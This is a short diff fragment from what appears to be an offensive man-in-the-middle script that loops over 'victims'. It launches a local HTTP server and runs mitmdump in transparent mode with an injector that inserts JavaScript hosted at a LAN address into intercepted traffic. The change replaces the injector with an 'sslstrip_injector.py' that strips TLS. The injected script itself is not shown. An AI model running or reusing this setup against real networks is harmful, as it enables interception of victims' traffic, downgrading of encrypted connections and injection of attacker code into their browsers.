@@ -49,4 +49,4 @@ for victim in victims:
 os.system("xterm -hold -e 'python3 httpServer.py' &")
 
 # start the mitmproxy
-os.system("~/.local/bin/mitmdump -s 'new_injector.py http://192.168.0.14:8000/script.js' -T")
+os.system("~/.local/bin/mitmdump -s 'sslstrip_injector.py http://192.168.0.14:8000/script.js' -T")
